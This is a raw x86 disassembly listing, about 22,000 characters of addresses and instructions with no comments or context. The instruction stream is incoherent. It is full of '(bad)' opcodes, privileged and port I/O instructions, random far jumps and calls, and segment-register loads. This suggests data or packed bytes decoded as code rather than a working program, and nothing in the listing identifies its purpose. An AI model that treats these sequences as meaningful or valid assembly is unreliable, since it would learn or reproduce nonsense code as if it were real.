  41f236:	sub    DWORD PTR [ecx-0x80],0x6051a42c
  41f23d:	in     eax,0x54
  41f23f:	push   eax
  41f240:	cdq    
  41f241:	repz fcomp st(3)
  41f244:	push   0xb1d842
	...
  41f251:	xor    dl,al
  41f253:	and    ecx,ebp
  41f255:	repz jmp 0x41f250
  41f258:	fcmovnb st,st(3)
  41f25a:	pop    ebp
  41f25b:	sbb    DWORD PTR [ecx+0x5b],ebx
  41f25e:	and    bl,BYTE PTR [ebx+0x16d6f3f]
  41f264:	add    BYTE PTR [edi-0x1efffffd],ch
  41f26a:	mov    ah,0x23
  41f26c:	inc    ecx
  41f26d:	jno    0x41f2ec
  41f26f:	fisubr DWORD PTR [ebp-0x8]
  41f272:	je     0x41f2b7
  41f274:	xchg   ebp,eax
  41f275:	icebp  
  41f276:	dec    edx
  41f277:	jge    0x41f225
  41f279:	repnz mov DWORD PTR [eax+0x4],0xdf9a2c38
  41f281:	into   
  41f282:	into   
  41f283:	mov    ds:0xc6f5de7c,al
  41f288:	jo     0x41f234
  41f28a:	(bad)  
  41f28b:	mov    fs,WORD PTR [ebx-0x5966761b]
  41f291:	rol    BYTE PTR [esi+0xa2657c7],0xaf
  41f298:	xor    eax,0x1138d0f9
  41f29d:	mov    ah,0xad
  41f29f:	jl     0x41f313
  41f2a1:	lods   al,BYTE PTR ds:[esi]
  41f2a2:	cli    
  41f2a3:	pop    edx
  41f2a4:	arpl   WORD PTR [ebx-0x159403c3],si
  41f2aa:	mov    dl,0x17
  41f2ac:	push   edi
  41f2ad:	loop   0x41f29a
  41f2af:	lods   eax,DWORD PTR ds:[esi]
  41f2b0:	daa    
  41f2b1:	inc    eax
  41f2b2:	push   esi
  41f2b3:	xchg   edx,eax
  41f2b4:	int    0xc3
  41f2b6:	out    dx,eax
  41f2b7:	arpl   WORD PTR ds:0xe2181fe0,bx
  41f2bd:	dec    DWORD PTR [ecx+0x7b]
  41f2c0:	and    esp,0xbdb95076
  41f2c6:	js     0x41f2b8
  41f2c8:	pop    es
  41f2c9:	xlat   BYTE PTR ds:[ebx]
  41f2ca:	lods   eax,DWORD PTR ds:[esi]
  41f2cb:	sti    
  41f2cc:	inc    eax
  41f2cd:	js     0x41f34d
  41f2cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2d0:	daa    
  41f2d1:	jle    0x41f2c6
  41f2d3:	mov    ecx,0xd43f42a7
  41f2d8:	jnp    0x41f262
  41f2da:	or     BYTE PTR [edx],ch
  41f2dc:	fisubr WORD PTR [ebx*4-0x7d43cea3]
  41f2e3:	enter  0xdd88,0xd6
  41f2e7:	repnz xor BYTE PTR [eax-0x27],ch
  41f2eb:	(bad)  
  41f2ec:	(bad)  
  41f2ed:	xor    al,BYTE PTR [eax-0x6f57c399]
  41f2f3:	fidivr DWORD PTR [eax-0x7d]
  41f2f6:	test   DWORD PTR [eax+0x1fc3c566],eax
  41f2fc:	loope  0x41f2da
  41f2fe:	mov    bl,0x97
  41f300:	lods   al,BYTE PTR ds:[esi]
  41f301:	sbb    eax,0xa3fe3f90
  41f306:	pop    ebp
  41f307:	std    
  41f308:	jne    0x41f359
  41f30a:	and    edi,edi
  41f30c:	out    0x35,eax
  41f30e:	(bad)  
  41f30f:	push   0xffffffd4
  41f311:	retf   
  41f312:	jmp    0x645bca5b
  41f317:	adc    al,0xb2
  41f319:	xor    dh,BYTE PTR [eax+0x7]
  41f31c:	repz ret 0x892e
  41f320:	cmp    BYTE PTR [edx-0x65],al
  41f323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f324:	outs   dx,DWORD PTR ds:[esi]
  41f325:	dec    ebx
  41f326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f327:	xchg   DWORD PTR [eax-0xe031024],edi
  41f32d:	scas   al,BYTE PTR es:[edi]
  41f32e:	push   cs
  41f32f:	sbb    al,0x54
  41f331:	sbb    dh,BYTE PTR [edx-0x2874eebf]
  41f337:	xchg   esp,eax
  41f338:	jmp    0x41f3a6
  41f33a:	loop   0x41f2f6
  41f33c:	pop    es
  41f33d:	add    DWORD PTR [ebx-0x2c93d55c],eax
  41f343:	xor    BYTE PTR [edx+0x3026dce1],dl
  41f349:	mov    ebp,DWORD PTR [esi]
  41f34b:	leave  
  41f34c:	shr    BYTE PTR [ebx],cl
  41f34e:	mov    ebp,0xc274ebcb
  41f353:	enter  0xb2c3,0xef
  41f357:	sbb    dl,BYTE PTR ds:0xe6d4cda8
  41f35d:	inc    esp
  41f35e:	jg     0x41f2f9
  41f360:	sar    DWORD PTR [ebx-0x371db258],0x96
  41f367:	jno    0x41f36b
  41f369:	jo     0x41f376
  41f36b:	fs (bad) 
  41f36d:	cmp    DWORD PTR [esi+0x75df2c68],eax
  41f373:	aaa    
  41f374:	inc    ebp
  41f375:	scas   eax,DWORD PTR es:[edi]
  41f376:	(bad)  
  41f377:	stc    
  41f378:	bound  ebp,QWORD PTR [bp+di]
  41f37b:	add    BYTE PTR [esi+0x2b],al
  41f37e:	jmp    0x69bff125
  41f383:	adc    al,0x37
  41f385:	jno    0x41f3e5
  41f387:	dec    esi
  41f388:	data16 jge 0x41f368
  41f38b:	xchg   ecx,eax
  41f38c:	(bad)  [esi-0x9985d19]
  41f392:	rol    BYTE PTR [edx],cl
  41f394:	ins    DWORD PTR es:[edi],dx
  41f395:	inc    edi
  41f396:	inc    eax
  41f397:	push   esp
  41f398:	and    cl,bl
  41f39a:	clc    
  41f39b:	test   BYTE PTR [eax+eiz*2+0x12a7f4f4],al
  41f3a2:	inc    eax
  41f3a3:	in     eax,dx
  41f3a4:	aas    
  41f3a5:	aaa    
  41f3a6:	les    ebx,FWORD PTR [edx+0x1f1fe4ac]
  41f3ac:	into   
  41f3ad:	and    DWORD PTR [esi-0x19],ebp
  41f3b0:	mov    edi,0x3cca6a40
  41f3b5:	xor    ebp,esi
  41f3b7:	cmp    eax,DWORD PTR [edi]
  41f3b9:	ror    ecx,cl
  41f3bb:	or     esi,DWORD PTR [eax+edx*2+0x76]
  41f3bf:	call   0xae794d10
  41f3c4:	and    dh,ch
  41f3c6:	jb     0x41f357
  41f3c8:	inc    ecx
  41f3c9:	push   0x269f7369
  41f3ce:	xchg   al,al
  41f3d0:	cmp    bl,BYTE PTR [ebx]
  41f3d2:	push   0x1
  41f3d4:	lods   eax,DWORD PTR ds:[esi]
  41f3d5:	mov    esp,0xa033f5b1
  41f3da:	cdq    
  41f3db:	(bad)  
  41f3dc:	mov    ds:0xe5627004,al
  41f3e1:	imul   ebp,DWORD PTR [esi-0x1659c7b9],0xffffff98
  41f3e8:	cs and esp,ebp
  41f3eb:	xchg   ebp,edx
  41f3ed:	inc    eax
  41f3ee:	es adc al,0xdd
  41f3f1:	cmp    al,0xa5
  41f3f3:	xor    BYTE PTR [ecx+0x3c95b734],ch
  41f3f9:	sahf   
  41f3fa:	into   
  41f3fb:	aad    0x6
  41f3fd:	add    eax,0xe9ffdfd0
  41f402:	lahf   
  41f403:	aam    0xf8
  41f405:	sti    
  41f406:	scas   al,BYTE PTR es:[edi]
  41f407:	xor    al,0xf
  41f409:	lds    eax,FWORD PTR [ebp+0x3087fc36]
  41f40f:	into   
  41f410:	push   0xffffffcf
  41f412:	sub    al,0xa2
  41f414:	jb     0x41f3bc
  41f416:	mov    BYTE PTR [eax+0x40],dh
  41f419:	sub    DWORD PTR [eax+0x626f72a2],0x49
  41f420:	sbb    cl,cl
  41f422:	jbe    0x41f45b
  41f424:	mov    BYTE PTR [edi+edi*2-0x3725720],cl
  41f42b:	(bad)  
  41f42c:	fcomp  QWORD PTR [ecx]
  41f42e:	push   esp
  41f42f:	mov    ecx,0xba3998a6
  41f434:	loop   0x41f43e
  41f436:	adc    edx,ecx
  41f438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f439:	jl     0x41f46b
  41f43b:	mov    eax,0xbe1b7018
  41f440:	jns    0x41f4a6
  41f442:	jg     0x41f3ce
  41f444:	sub    BYTE PTR [edx-0x1a],ah
  41f447:	stc    
  41f448:	sub    al,ah
  41f44a:	stos   DWORD PTR es:[edi],eax
  41f44b:	xchg   ebp,eax
  41f44c:	icebp  
  41f44d:	sub    al,0x7d
  41f44f:	mov    ebx,0x364d9712
  41f454:	mov    bl,0x76
  41f456:	add    al,0x13
  41f458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f459:	mov    ds:0x5185a465,eax
  41f45e:	sub    eax,0xc41afb74
  41f463:	sahf   
  41f464:	or     al,0xe5
  41f466:	sbb    DWORD PTR [ebp+0x66908059],0xa90675d6
  41f470:	inc    ebp
  41f471:	jb     0x41f4b5
  41f473:	ins    DWORD PTR es:[edi],dx
  41f474:	dec    edx
  41f475:	fstp   DWORD PTR [edx]
  41f477:	xlat   BYTE PTR ds:[ebx]
  41f478:	mov    ah,0x48
  41f47a:	push   es
  41f47b:	in     eax,dx
  41f47c:	lods   al,BYTE PTR ds:[esi]
  41f47d:	xor    al,0xcc
  41f47f:	push   0x8cba4803
  41f484:	and    DWORD PTR [edi],ebx
  41f486:	fucomi st,st(4)
  41f488:	push   ebx
  41f489:	or     ecx,edx
  41f48b:	stos   BYTE PTR es:[edi],al
  41f48c:	jno    0x41f50b
  41f48e:	pop    edi
  41f48f:	dec    edi
  41f490:	adc    BYTE PTR [edi-0x5e761b3d],dh
  41f496:	mov    cl,0xc7
  41f498:	lea    edi,[edi-0x3c69b2ca]
  41f49e:	js     0x41f4d8
  41f4a0:	sub    al,0xea
  41f4a2:	in     al,0x2c
  41f4a4:	scas   eax,DWORD PTR es:[edi]
  41f4a5:	in     al,dx
  41f4a6:	sbb    al,0x61
  41f4a8:	(bad)  
  41f4a9:	daa    
  41f4aa:	bound  ebx,QWORD PTR [esp+edx*2+0xb]
  41f4ae:	in     al,dx
  41f4af:	arpl   bp,bp
  41f4b1:	jb     0x41f4ff
  41f4b3:	dec    edx
  41f4b4:	into   
  41f4b5:	rcr    DWORD PTR [eax+0x286493a2],1
  41f4bb:	dec    esi
  41f4bc:	cli    
  41f4bd:	fisubr DWORD PTR [ebp+ebp*8+0x60]
  41f4c1:	ins    DWORD PTR es:[edi],dx
  41f4c2:	mov    esi,0xeac9f038
  41f4c7:	lock add dl,bl
  41f4ca:	jle    0x41f4c8
  41f4cc:	ret    
  41f4cd:	push   ebx
  41f4ce:	cmp    ebx,DWORD PTR [ebx-0x36]
  41f4d1:	sub    ah,ah
  41f4d3:	cmp    edi,DWORD PTR [ebp-0x699bea9a]
  41f4d9:	sbb    eax,0x3bab67a4
  41f4de:	bnd jno 0x41f4a3
  41f4e1:	jl     0x41f4e8
  41f4e3:	mov    ebx,0xac20f9dc
  41f4e8:	dec    ebp
  41f4e9:	pop    esi
  41f4ea:	sbb    BYTE PTR [edx],0x98
  41f4ed:	sbb    eax,0x3eb54b16
  41f4f2:	mov    esi,0x1ce94dd2
  41f4f7:	lock sar DWORD PTR [edx+esi*4-0x29c3dc68],1
  41f4ff:	adc    eax,0x76b6fe80
  41f504:	jo     0x41f55c
  41f506:	aaa    
  41f507:	push   eax
  41f508:	out    0x12,eax
  41f50a:	mov    eax,0x59a9937c
  41f50f:	mov    eax,0xc45afc5b
  41f514:	add    eax,0x8e252a20
  41f519:	not    DWORD PTR [edi+0x1b]
  41f51c:	lods   al,BYTE PTR ds:[esi]
  41f51d:	xor    ch,BYTE PTR [ebp+ecx*1-0x348e3266]
  41f524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f525:	or     DWORD PTR [edi],0x63f95d41
  41f52b:	adc    DWORD PTR [ebp+0x17],ebx
  41f52e:	test   DWORD PTR ds:[eax+0x727b3d9f],ebx
  41f535:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f536:	push   eax
  41f537:	cmc    
  41f538:	sub    esp,DWORD PTR [edi]
  41f53a:	imul   esi,edi,0xffffffb1
  41f53d:	add    eax,0xd9ba0109
  41f542:	jne    0x41f57d
  41f544:	mov    edi,esp
  41f546:	sub    ecx,DWORD PTR [esp+edi*1+0x1d]
  41f54a:	xor    bh,BYTE PTR [ebx+0x2450cc20]
  41f550:	fidiv  WORD PTR [eax-0x2036faa7]
  41f556:	lds    ebp,FWORD PTR [esi-0x2874f67c]
  41f55c:	loopne 0x41f555
  41f55e:	aam    0x75
  41f560:	std    
  41f561:	test   BYTE PTR [ecx-0x70d97c75],dh
  41f567:	pop    es
  41f568:	mov    bl,0xd
  41f56a:	cs test bl,bh
  41f56d:	es pop edx
  41f56f:	aad    0x82
  41f571:	rcr    ah,0x43
  41f574:	inc    ecx
  41f575:	std    
  41f576:	cmp    esp,DWORD PTR [ebp+0x30]
  41f579:	pop    eax
  41f57a:	fmul   DWORD PTR [esi-0x4df560dc]
  41f580:	pop    ecx
  41f581:	outs   dx,BYTE PTR ds:[esi]
  41f582:	clc    
  41f583:	xchg   edi,eax
  41f584:	(bad)  
  41f585:	ja     0x41f548
  41f587:	sbb    cl,BYTE PTR [ebx]
  41f589:	xchg   ebp,eax
  41f58a:	add    BYTE PTR [ecx+0xf],bl
  41f58d:	dec    eax
  41f58e:	pop    ss
  41f58f:	stc    
  41f590:	mov    ebp,0x50bce2c0
  41f595:	pop    ss
  41f596:	jl     0x41f5ff
  41f598:	cmp    ebp,ebp
  41f59a:	pop    es
  41f59b:	cli    
  41f59c:	dec    ecx
  41f59d:	mov    fs,WORD PTR [edi+0x62]
  41f5a0:	dec    esi
  41f5a1:	sti    
  41f5a2:	dec    eax
  41f5a3:	mov    fs,ecx
  41f5a5:	out    0x1f,eax
  41f5a7:	xchg   edx,eax
  41f5a8:	int3   
  41f5a9:	adc    BYTE PTR cs:[ebx],ch
  41f5ac:	leave  
  41f5ad:	jge    0x41f570
  41f5af:	cli    
  41f5b0:	aas    
  41f5b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5b2:	je     0x41f5d3
  41f5b4:	pusha  
  41f5b5:	retf   0xe022
  41f5b8:	ret    
  41f5b9:	push   0xbb17152c
  41f5be:	cmc    
  41f5bf:	sub    esp,eax
  41f5c1:	adc    DWORD PTR [esi-0x4f],ebp
  41f5c4:	mov    esp,0x11c4f43b
  41f5c9:	add    al,0xaf
  41f5cb:	std    
  41f5cc:	xchg   edx,eax
  41f5cd:	adc    DWORD PTR [ebx],edi
  41f5cf:	and    eax,0x8dd9e121
  41f5d4:	ret    0x8325
  41f5d7:	jle    0x41f5a1
  41f5d9:	leave  
  41f5da:	sub    ch,ah
  41f5dc:	mov    dh,ah
  41f5de:	loop   0x41f5cf
  41f5e0:	adc    eax,0xba7070c1
  41f5e5:	iret   
  41f5e6:	adc    dl,0x3a
  41f5e9:	add    bl,ch
  41f5eb:	mov    BYTE PTR [ebx-0x1e02c28a],bl
  41f5f1:	jne    0x41f62a
  41f5f3:	adc    eax,0x5891f23d
  41f5f8:	cmp    DWORD PTR [edi-0x69],esp
  41f5fb:	adc    cl,0x24
  41f5fe:	mov    ah,0x1e
  41f600:	dec    edx
  41f601:	fbld   TBYTE PTR [esi]
  41f603:	adc    cl,BYTE PTR [edx+ebp*8+0x26f9376]
  41f60a:	jge    0x41f5ca
  41f60c:	dec    esi
  41f60d:	jno    0x41f632
  41f60f:	jp     0x41f68d
  41f611:	stc    
  41f612:	test   al,0x9a
  41f614:	fdiv   st(1),st
  41f616:	int3   
  41f617:	in     al,0x0
	...
  41f621:	inc    edx
  41f622:	add    eax,0x65676020
  41f627:	inc    edx
  41f628:	daa    
  41f629:	sti    
  41f62a:	mov    ch,0xb1
  41f62c:	push   edx
  41f62d:	push   ds
  41f62e:	mov    al,ds:0x711ece5d
  41f633:	add    DWORD PTR [eax],eax
  41f635:	scas   eax,DWORD PTR es:[edi]
  41f636:	add    eax,DWORD PTR [eax]
  41f638:	add    BYTE PTR [ebp-0x68156c6d],cl
  41f63e:	cdq    
  41f63f:	std    
  41f640:	push   edx
  41f641:	bound  ecx,QWORD PTR [eax+0x5102f3e0]
  41f647:	or     edx,eax
  41f649:	icebp  
  41f64a:	out    0x19,al
  41f64c:	aam    0x3
  41f64e:	mov    al,BYTE PTR [edi+0x6f]
  41f651:	sbb    eax,0xc857f074
  41f656:	lods   eax,DWORD PTR ds:[esi]
  41f657:	and    DWORD PTR [eax+0xc],ebx
  41f65a:	inc    ecx
  41f65b:	imul   DWORD PTR [edi-0x36]
  41f65e:	fbstp  TBYTE PTR [esi+0x3295538c]
  41f664:	sub    cl,BYTE PTR [edi+edi*8+0x570c000f]
  41f66b:	bound  esi,QWORD PTR [esi+esi*8-0x7eef51a5]
  41f672:	inc    ebp
  41f673:	cmp    ebx,DWORD PTR [eax]
  41f675:	in     al,dx
  41f676:	dec    ebp
  41f677:	enter  0xc8b6,0x1b
  41f67b:	jle    0x41f65f
  41f67d:	xlat   BYTE PTR ds:[ebx]
  41f67e:	jnp    0x41f69c
  41f680:	mov    DWORD PTR [edi],ecx
  41f682:	inc    esi
  41f683:	ret    
  41f684:	jbe    0x41f6ca
  41f686:	mov    BYTE PTR [ebx+0x4c5a10eb],bl
  41f68c:	dec    ebx
  41f68d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f68e:	push   0xffffffc5
  41f690:	ins    BYTE PTR es:[edi],dx
  41f691:	sub    edx,edi
  41f693:	jg     0x41f645
  41f695:	fistp  WORD PTR [eax+0x3e36a28c]
  41f69b:	(bad)  
  41f69d:	es push esi
  41f69f:	stos   BYTE PTR es:[edi],al
  41f6a0:	push   cs
  41f6a1:	jmp    0x41f66d
  41f6a3:	mov    ecx,0x4f6c488a
  41f6a8:	scas   al,BYTE PTR es:[edi]
  41f6a9:	idiv   esp
  41f6ab:	xor    al,BYTE PTR fs:[eax]
  41f6ae:	jmp    0x41f635
  41f6b0:	gs outs dx,DWORD PTR fs:[esi]
  41f6b3:	add    eax,0xe7d8be74
  41f6b8:	xor    BYTE PTR [eax+0x1c],bh
  41f6bb:	mov    dl,0x3
  41f6bd:	cdq    
  41f6be:	mov    eax,0xf2c4fcc8
  41f6c3:	add    eax,0x311ad80f
  41f6c8:	sbb    DWORD PTR [ebp*2+0x1808b3fe],ebp
  41f6cf:	jnp    0x41f690
  41f6d1:	retf   0xa479
  41f6d4:	retf   
  41f6d5:	jo     0x41f6e4
  41f6d7:	shl    DWORD PTR [edx+eiz*1-0x1bb12f0],0x89
  41f6df:	jl     0x41f696
  41f6e1:	mov    eax,ds:0x2f7bbefa
  41f6e6:	fild   DWORD PTR [ecx+0x89437aa]
  41f6ec:	xor    edx,eax
  41f6ee:	repnz xchg esp,eax
  41f6f0:	sub    bh,BYTE PTR [edx-0x25476117]
  41f6f6:	pop    edi
  41f6f7:	and    DWORD PTR [ebx+eiz*8+0x378d2d0b],esp
  41f6fe:	cli    
  41f6ff:	xchg   esp,eax
  41f700:	nop
  41f701:	pop    ecx
  41f702:	idiv   bl
  41f704:	(bad)  
  41f705:	leave  
  41f706:	jbe    0x41f786
  41f708:	lock or ebx,esi
  41f70b:	stc    
  41f70c:	test   edi,eax
  41f70e:	test   DWORD PTR [ebx+0x6d],esp
  41f711:	(bad)  
  41f712:	xchg   edx,eax
  41f713:	pusha  
  41f714:	dec    edx
  41f715:	jg     0x41f731
  41f717:	popf   
  41f718:	and    al,0x38
  41f71a:	jnp    0x41f784
  41f71c:	push   es
  41f71d:	pop    esi
  41f71e:	mov    ds:0x35374b3b,al
  41f723:	lods   eax,DWORD PTR ds:[esi]
  41f724:	mov    BYTE PTR [edi-0x6e],al
  41f727:	cmp    DWORD PTR [edx],eax
  41f729:	cwde   
  41f72a:	shl    BYTE PTR [esi+0x403d5df2],0x1f
  41f731:	cmp    ch,BYTE PTR ds:0x6f867d12
  41f737:	out    0x6d,al
  41f739:	fidivr WORD PTR [eax-0x71]
  41f73c:	inc    ebx
  41f73d:	add    bl,ch
  41f73f:	xchg   edx,eax
  41f740:	mov    DWORD PTR [edx],edi
  41f742:	or     bh,al
  41f744:	je     0x41f6e6
  41f746:	inc    ecx
  41f747:	fyl2xp1 
  41f749:	jge    0x41f71b
  41f74b:	mov    ds:0xd3afd2d5,al
  41f751:	imul   eax,DWORD PTR [edx+0x7a],0xffffffaa
  41f755:	jmp    0x3c676be1
  41f75a:	or     ecx,esp
  41f75c:	outs   dx,BYTE PTR ds:[esi]
  41f75d:	test   al,0xfe
  41f75f:	fstp   QWORD PTR [ebx]
  41f761:	repnz fldcw WORD PTR [esi+0x37]
  41f765:	mov    al,0x2
  41f767:	push   0x4572a20a
  41f76c:	add    BYTE PTR [ebx-0x291d37be],dl
  41f772:	(bad)  
  41f773:	jmp    0xfc05cdc8
  41f778:	mov    al,ds:0xb808e7a2
  41f77d:	xchg   ebp,eax
  41f77e:	mov    eax,0xbbd82050
  41f783:	pop    edi
  41f784:	jecxz  0x41f738
  41f786:	sbb    cl,BYTE PTR [ebx-0xc]
  41f789:	ins    BYTE PTR es:[edi],dx
  41f78a:	mov    dl,0x9b
  41f78c:	adc    esp,DWORD PTR [eax+0x748df708]
  41f792:	inc    edi
  41f793:	xchg   ebx,eax
  41f794:	inc    ebp
  41f795:	(bad)  ss:[ebx+0x72a28d71]
  41f79c:	sbb    BYTE PTR [ecx+0x41],al
  41f79f:	cmp    al,0xca
  41f7a1:	in     al,dx
  41f7a2:	out    dx,eax
  41f7a3:	mov    esi,0x12df8d7d
  41f7a8:	push   eax
  41f7a9:	push   cs
  41f7aa:	pop    edx
  41f7ab:	aaa    
  41f7ac:	add    eax,0x2e746ee4
  41f7b1:	xchg   esi,eax
  41f7b2:	rcr    BYTE PTR [ecx+0x28],0x69
  41f7b6:	mov    al,0xb7
  41f7b8:	xchg   ebx,eax
  41f7b9:	mov    esp,0x846cc66f
  41f7be:	xor    esp,ebx
  41f7c0:	fisttp WORD PTR [ecx+esi*2-0x37]
  41f7c4:	adc    DWORD PTR [edi+0x2c2c503d],ebx
  41f7ca:	or     ch,BYTE PTR [eax+ebp*4-0x54]
  41f7ce:	jne    0x41f7bf
  41f7d0:	test   BYTE PTR [edi-0x33],0xcd
  41f7d4:	imul   edi,DWORD PTR [edx-0x42],0xfaf749b6
  41f7db:	punpcklwd mm0,mm4
  41f7de:	mov    bh,BYTE PTR [edi+edx*2]
  41f7e1:	mov    al,ds:0x9bd27801
  41f7e6:	mov    ds:0x1b4ddd48,eax
  41f7eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7ec:	mov    bl,BYTE PTR [edi-0x3aefbc58]
  41f7f2:	or     al,0x40
  41f7f4:	inc    ebx
  41f7f5:	mov    edi,0x35f195cc
  41f7fa:	data16 mov al,0x59
  41f7fd:	in     eax,0x45
  41f7ff:	cwde   
  41f800:	cmc    
  41f801:	add    eax,0x29c60fc3
  41f806:	xchg   DWORD PTR [eax+0x3fcd7c9],edx
  41f80c:	add    al,0x67
  41f80e:	in     al,0x7d
  41f810:	sub    cl,BYTE PTR [ebp-0x11]
  41f813:	dec    ebx
  41f814:	out    dx,al
  41f815:	fdiv   DWORD PTR [ecx-0x536fad0a]
  41f81b:	sub    BYTE PTR [ebx],dl
  41f81d:	push   cs
  41f81e:	sahf   
  41f81f:	push   es
  41f820:	retf   0xffc6
  41f823:	cwde   
  41f824:	ret    0x938c
  41f827:	push   eax
  41f828:	aas    
  41f829:	sub    BYTE PTR [ebx-0x5b],bl
  41f82c:	add    BYTE PTR [eax+0x446a67a9],bl
  41f832:	add    cl,ch
  41f834:	mov    esi,0x2679e7cd
  41f839:	push   ds
  41f83a:	xor    al,0x20
  41f83c:	(bad)  
  41f83d:	jae    0x41f80f
  41f83f:	adc    edi,DWORD PTR [edx-0x53d671a7]
  41f845:	inc    ebx
  41f846:	pushw  0xffd1
  41f849:	popa   
  41f84a:	stc    
  41f84b:	xchg   DWORD PTR [esi],ebx
  41f84d:	call   0x16d746e2
  41f852:	xor    ch,BYTE PTR [edi-0x21f61112]
  41f858:	ss mov esp,0x427a69e6
  41f85e:	inc    edx
  41f85f:	div    DWORD PTR [edi+eiz*4-0x26a5f10a]
  41f866:	sti    
  41f867:	sahf   
  41f868:	getsec 
  41f86a:	and    edx,DWORD PTR [edi+edx*8]
  41f86d:	jle    0x41f858
  41f86f:	push   ecx
  41f870:	icebp  
  41f871:	add    ebx,DWORD PTR [esi-0x32741730]
  41f877:	(bad)  
  41f878:	cmp    eax,0x5de02948
  41f87d:	das    
  41f87e:	and    cl,BYTE PTR [ebx+esi*1]
  41f881:	mov    esi,?
  41f883:	popa   
  41f884:	call   0x2fd9:0x796ebfe5
  41f88b:	inc    esi
  41f88c:	adc    BYTE PTR [ebp+ebx*4-0x2d],dh
  41f890:	rcl    DWORD PTR [esi+0x73e7e3a8],1
  41f896:	push   ebp
  41f898:	lea    esi,[edx-0x3b]
  41f89b:	stos   DWORD PTR es:[edi],eax
  41f89c:	nop
  41f89d:	inc    edi
  41f89e:	in     al,0x73
  41f8a0:	jnp    0x41f857
  41f8a2:	xchg   ebp,eax
  41f8a3:	pusha  
  41f8a4:	push   cs
  41f8a5:	gs mov ecx,0x1cfa5209
  41f8ab:	mov    ch,0xef
  41f8ad:	clc    
  41f8ae:	outs   dx,DWORD PTR ds:[esi]
  41f8af:	data16 mov al,bl
  41f8b2:	mov    al,0x32
  41f8b4:	adc    eax,0xd4c63bad
  41f8b9:	sub    BYTE PTR [esi-0x35875fda],0x5b
  41f8c0:	cdq    
  41f8c1:	mov    cl,0x8c
  41f8c3:	jne    0x41f87c
  41f8c5:	sbb    ebx,DWORD PTR [edx+0x23]
  41f8c8:	cdq    
  41f8c9:	mov    cs,WORD PTR [eax]
  41f8cb:	lds    esi,FWORD PTR [edx-0x34]
  41f8ce:	rol    DWORD PTR [ebp+ebp*8+0x8],1
  41f8d2:	jmp    0xd6748138
  41f8d7:	outs   dx,DWORD PTR ds:[esi]
  41f8d8:	inc    ebp
  41f8d9:	popa   
  41f8da:	inc    edi
  41f8db:	sbb    esp,DWORD PTR [ecx+0x7289c757]
  41f8e1:	retf   0xbafd
  41f8e4:	popa   
  41f8e5:	xchg   edx,eax
  41f8e6:	test   BYTE PTR [ebx-0x2e],al
  41f8e9:	ret    
  41f8ea:	int3   
  41f8eb:	pop    esp
  41f8ec:	dec    ecx
  41f8ed:	push   0x31575a4d
  41f8f2:	mov    esi,0x6e22a75a
  41f8f7:	push   ebp
  41f8f8:	outs   dx,DWORD PTR ds:[esi]
  41f8f9:	add    DWORD PTR [eax-0x163fecb],ebx
  41f8ff:	retf   
  41f900:	and    ch,bl
  41f902:	add    esp,DWORD PTR [edx]
  41f904:	cmp    DWORD PTR [ebp-0x74],ecx
  41f907:	sub    esp,ebx
  41f909:	jns    0x41f8eb
  41f90b:	mov    dh,0xa4
  41f90d:	je     0x41f8a3
  41f90f:	inc    ebx
  41f910:	and    eax,0xbc9aee3
  41f915:	mov    ebx,0x9e2e9064
  41f91a:	mov    bl,BYTE PTR [ebx-0x6956bf17]
  41f920:	clc    
  41f921:	mov    edi,0x549c0d35
  41f926:	cmp    al,0x8f
  41f928:	jle    0x41f90e
  41f92a:	add    eax,0xb393ddb7
  41f92f:	jmp    0xb9e5eff6
  41f934:	xchg   edi,eax
  41f935:	pop    esp
  41f936:	jns    0x41f919
  41f938:	jns    0x41f917
  41f93a:	jp     0x41f9ac
  41f93c:	lods   eax,DWORD PTR ds:[esi]
  41f93d:	push   cs
  41f93e:	mov    eax,ds:0x9a462a18
  41f943:	adc    al,0xa3
  41f945:	xchg   edx,eax
  41f946:	inc    ebx
  41f947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f948:	pop    es
  41f949:	pop    edi
  41f94a:	lods   eax,DWORD PTR ds:[esi]
  41f94b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f94c:	mov    cs,esp
  41f94e:	push   ss
  41f94f:	mov    ds:0x9fa5696e,eax
  41f954:	ss icebp 
  41f956:	sub    eax,0x10cd6cf0
  41f95b:	or     DWORD PTR ds:0x53fa5b72,edx
  41f961:	push   edi
  41f962:	(bad)  [edx-0x618a3ca3]
  41f968:	or     ah,BYTE PTR [edx+0x62]
  41f96b:	repnz call 0xc0c5:0xeac40dc2
  41f973:	bound  esp,QWORD PTR [edi+0x7ed2a3bf]
  41f979:	push   edx
  41f97a:	in     al,dx
  41f97b:	imul   edx,esp,0xffffffd6
  41f97e:	xchg   esi,eax
  41f97f:	mov    edx,DWORD PTR [esi]
  41f981:	in     al,0x17
  41f983:	int    0x82
  41f985:	ins    BYTE PTR es:[edi],dx
  41f986:	loop   0x41f9df
  41f988:	xchg   edx,eax
  41f989:	(bad)  
  41f98a:	je     0x41f912
  41f98c:	rcl    DWORD PTR [edi+0xc],cl
  41f98f:	fild   DWORD PTR [edi+0xd1b312e]
  41f995:	mov    edi,0x636bdb4b
  41f99a:	xchg   ecx,eax
  41f99b:	cmp    al,0x2d
  41f99d:	fistp  DWORD PTR [edx+0xc47c469]
  41f9a3:	cli    
  41f9a4:	adc    cl,BYTE PTR [edi-0x4861fde7]
  41f9aa:	push   ebx
  41f9ab:	push   ebp
  41f9ac:	push   0xa509e99d
  41f9b1:	scas   al,BYTE PTR es:[edi]
  41f9b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9b3:	popa   
  41f9b4:	inc    edi
  41f9b5:	test   eax,0xc973e4bb
  41f9ba:	(bad)  
  41f9bb:	dec    eax
  41f9bc:	repz pop es
  41f9be:	inc    ebp
  41f9bf:	add    edx,DWORD PTR [edi+0xf]
  41f9c2:	add    BYTE PTR [ebx+0x67eb9ea9],cl
  41f9c8:	fistp  QWORD PTR [esi+0x45]
  41f9cb:	or     ebx,edx
  41f9cd:	pop    ebp
